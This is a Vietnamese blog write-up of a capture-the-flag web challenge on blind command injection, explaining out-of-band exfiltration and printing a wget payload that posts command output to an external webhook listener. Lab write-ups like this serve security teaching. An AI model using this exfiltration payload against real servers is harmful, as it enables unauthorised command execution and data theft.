---
title: Write-Up Blind Command Injection
date: 2023-09-17 12:34:01 +0700
categories: [CTF, Cookie Hân Hoan, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
Địa chỉ : **[Blind Command Injection](https://battle.cookiearena.org/challenges/web/blind-command-injection)**

## **Challenge Details**

It retrieves the value of the query parameter 'cmd' from the request's query string. If no value is provided for 'cmd,' it returns the string "?cmd=[cmd]". If the HTTP method is not GET (which means it's another method, like POST or PUT, HEAD), it executes the command specified in the 'cmd' parameter using `os. system(cmd)`.

It can potentially be dangerous as it allows the execution of arbitrary commands passed as input. But we can not see the result because the admin is not using the `print()` function.

Please use the `OOB` technique to catch the request. The Out-Of-Band (OOB) technique allows an attacker to confirm and exploit a vulnerability that would otherwise be blind. As an attacker, you do not receive the vulnerability's output in direct response to the vulnerable request in a blind vulnerability. Can you catch the result? How to read the `/flag.txt`. Do you try the OPTIONS Method?

## **Tags**

- Blind Command Injection
- Out-of-band (OOB)

*GIẢI THÍCH NGẮN VỀ In-Band VÀ Out-Of-Band*

*In-Band*

Là thực thi truyền hay gửi gói tin dữ liệu trong cùng lớp mạng hệ thống.
Ví dụ bạn thực thi câu lệnh trên webshell của 1 trang web

Thì gói tin gửi về server và trả về lại trang web và hiển thị lại cho bạn là trên lớp mạng hệ thống.

*Out-Of-Band*

Là thực thi truyền hoặc gửi dữ liệu ra bên ngoài.

Ví dụ: Tuy bạn thực thi câu lệnh webshell tuy nhiên gói tin trả về trên cùng hệ thống thì nó không hiển thị… nên buộc bạn phải gửi gói tin về 1 server web bên ngoài mới xem được.

Chi tiết bạn có thể tự tìm hiểu nha.

## ****Web Analysis:****

Tại `/` trang web:

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled.png)

Tại giao diện thì web hiển thị cho ta 1 parameter là ?cmd và cho giá trị đưa và là lệnh command.

hmm

Mình thử sử dụng parameter này truyền thử câu lệnh này xem sao nhé…

ở đây mình test bằng burpsuite.

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%201.png)

Lúc này mình đã thực thi lệnh **`id`** tuy nhiên thì lệnh này trả về output những gì đã nhập… thì có vẽ như là tuy nó cho nhập nhưng nó `không thực thi`.

Thì ban đầu mình đã giới thiệu sơ qua về kĩ thuật `In-Band` và `Out-Of-Band`.

Mà để làm được `bắn gói tin ra ngoà`i thì mình sử dụng `curl`, `wget`…

Ở đây mình sử dụng [webhook](https://webhook.site) để nhận gói tin.

Mình thử test curl tới webhook của mình xem nó có hoạt động hay không nhé.

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%202.png)

Quan sát bên webhook.

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%203.png)

Có vẻ như lệnh curl nó đã không được thực thi.

Giờ mình thử wget xem sao.

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%204.png)

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%205.png)

Kết quả nó vẫn không hoạt động

Có vẻ như nó không thể thực thi câu lệnh ngay chính trang web của nó.

Mình đã tìm hiểu về cách post data của curl và wget thông qua chatgpt.

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%206.png)

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%207.png)

giờ đặt ra câu hỏi là “Sẽ ra sao nếu chúng ta gửi 1 câu lệnh command thông qua curl và wget”.

giờ mình test nha.

Nhưng vẫn chưa hoạt động sau khi test 77 49 lần và mình đọc lại đề và phát hiện là nếu phương thức GET không hoạt động thì còn các phương thức khác.

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%208.png)

Tiến hành đỗi và test.

## ****Exploiting Command Injection Out-Of-Band****

Payload:

```jsx
wget --post-data "$(id)” URL
```

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%209.png)

Nó đã gửi thành công.

quan sát webhook:

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%2010.png)

Kết quả đúng như mình mong đợi =))

Việc còn lại là xem file flag ở đâu thôi..

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%2011.png)

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%2012.png)

Cat Flag

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%2013.png)

![Untitled](/assets/writeup/cookie/BlindCMDI/Untitled%2014.png)

DONE =)))

`***Written by Ren***`